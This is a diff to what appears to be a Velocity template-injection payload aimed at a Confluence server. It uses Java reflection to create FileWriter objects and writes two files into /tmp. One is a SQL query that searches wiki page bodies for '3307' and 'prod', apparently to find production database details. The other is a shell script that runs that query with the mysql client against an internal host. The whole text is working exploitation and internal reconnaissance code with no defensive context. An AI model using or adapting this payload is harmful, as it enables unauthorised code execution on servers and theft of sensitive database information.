@@ -1,6 +1,6 @@
 #set($x = "")
 #set($w1 = $x.getClass().forName("java.io.FileWriter").getConstructor($x.getClass().forName("java.lang.String")).newInstance("/tmp/zz_q.sql"))
-$w1.write("select c.CONTENTID, s.SPACEKEY, c.TITLE from BODYCONTENT b join CONTENT c on b.CONTENTID=c.CONTENTID join SPACES s on c.SPACEID=s.SPACEID where b.BODY like '%3307%' and (b.BODY like '%prod%' or b.BODY like '%生产%') limit 40;")
+$w1.write("select c.CONTENTID, s.SPACEKEY, c.TITLE from BODYCONTENT b join CONTENT c on b.CONTENTID=c.CONTENTID join SPACES s on c.SPACEID=s.SPACEID where b.BODY like '%3307%' and b.BODY like '%prod%' limit 40;")
 $w1.close()
 #set($w2 = $x.getClass().forName("java.io.FileWriter").getConstructor($x.getClass().forName("java.lang.String")).newInstance("/tmp/zz_cmd.sh"))
 $w2.write("echo ===HIT===; mysql -h10.18.19.53 -D confluence -N --batch < /tmp/zz_q.sql 2>&1 | head -45")
